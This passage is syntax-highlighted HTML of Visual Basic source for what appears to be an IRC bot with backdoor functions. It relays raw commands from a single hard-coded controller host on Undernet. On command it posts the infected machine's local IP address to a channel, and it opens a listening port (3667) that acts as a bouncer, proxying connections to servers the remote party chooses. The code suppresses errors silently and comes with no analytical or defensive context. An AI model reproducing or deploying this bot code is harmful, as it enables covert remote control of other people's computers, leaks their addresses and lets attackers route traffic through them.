</span><span class="sc7">Host.h_addr_list</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Host.h_addr_list</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">LenB</span><span class="sc6">(</span><span class="sc7">Host.h_addr_list</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Host.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">hostip_addr</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">GetLclIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EvalCode</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"PING"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
  </span><span class="sc7">Rpt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"PONG :"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Rpt</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"SMD"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
  </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">))(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"@"</span><span class="sc6">)(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc4">"DarkMachine.users.undernet.org"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
  </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
  </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">)(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Code</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"GETIP"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
  </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
  </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">bSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PRIVMSG #"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">rCh</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" :"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetLclIP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Code</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EvalCodeB</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"NICK"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">cNick</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"USER"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">cUser</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"CON"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">BnCServer</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">))</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"EXITBNC"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">bc</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">codel</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EvalCodeC</span><span class="sc6">(</span><span class="sc7">codes</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">bc</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">codes</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">codes</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">StartBnC</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">lSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ListenSock</span><span class="sc6">(</span><span class="sc2">3667</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Form1.hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1026</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">BnC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">BnCServer</span><span class="sc6">(</span><span class="sc7">sParam</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">sSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">sParam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">))(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Form1.hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">CLng</span><span class="sc6">(</span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">sParam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">))(</span><span class="sc2">2</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">1028</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"No Conection"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">cSock</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc7">bc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">pSock</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cNick</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc7">sSock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cUser</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ListenSock</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Port</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wLong</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">selectops</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">

</span><span class="sc7">sockin.sin_family</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AF_INET</span><span class="sc0">
</span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc6">(</span><span class="sc7">Port</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htonl</span><span class="sc6">(</span><span class="sc7">INADDR_ANY</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc6">(</span><span class="sc7">AF_INET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
    
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">bind</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
   </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">selectops</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_ACCEPT</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wLong</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">selectops</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
   </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">listen</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
   </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc7">ListenSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">AcceptSock</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">sock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wLong</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bClient</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">selectops</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">accept</span><span class="sc6">(</span><span class="sc7">sock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bClient</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">AcceptSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">selectops</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAAsyncSelect</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wLong</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">selectops</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
   </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
   </span><span class="sc7">AcceptSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">AcceptSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span></div></body>
</html>
